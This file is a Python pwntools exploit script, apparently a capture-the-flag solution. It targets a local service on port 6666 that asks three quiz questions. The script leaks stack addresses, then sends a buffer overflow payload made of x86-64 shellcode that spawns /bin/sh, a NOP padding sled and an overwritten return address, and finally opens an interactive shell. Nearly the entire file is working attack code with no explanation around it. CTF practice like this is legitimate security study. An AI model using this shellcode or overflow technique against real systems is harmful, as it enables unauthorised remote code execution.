from pwn import *
import time
import hexdump

context(os='linux', arch='amd64')
context.log_level = 'debug'

shellcode = '\x48\x31\xff\x40\xb7\x03\x48\x31\xc0\xb0\x03\x0f\x05\x40\xb7\x04\x48\x31\xf6\x40\xb6\x03\x48\x31\xc0\x48\xff\xce\xb0\x21\x0f\x05\x75\xf4' + '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x90'

def solve(conn):
    conn.recv()
    conn.sendline('arsenal')
    time.sleep(1)

    conn.recv()
    conn.sendline('gyeongbokgung')
    time.sleep(1)

    conn.recv()
    conn.sendline('psy')
    time.sleep(1)

def leak_addr(conn):
    solve(conn)
    conn.recv()
    conn.sendline('A'+'\x00')
    time.sleep(1)

    leak = conn.recv()
    addr = []
    for i, d in enumerate(leak):
        if d == '\x7f':
            addr.append(leak[i-5:i+1])
    return addr

if __name__ == '__main__':
   conn = remote('localhost', 6666)
   addr = leak_addr(conn) 
   addr = list(set(addr))

   for a in addr:
       hex_addr = "0x" + a.encode('hex')
       conn = remote('localhost', 6666)
       solve(conn)
       p = shellcode + '\x90' * (264 - len(shellcode)) + p64(eval(hex_addr))
       conn.sendafter("name:", p)
       conn.recv()

       conn.sendline('ls')
       try:
           print(conn.recv())
           conn.interactive()
       except Exception as e:
            print(e)
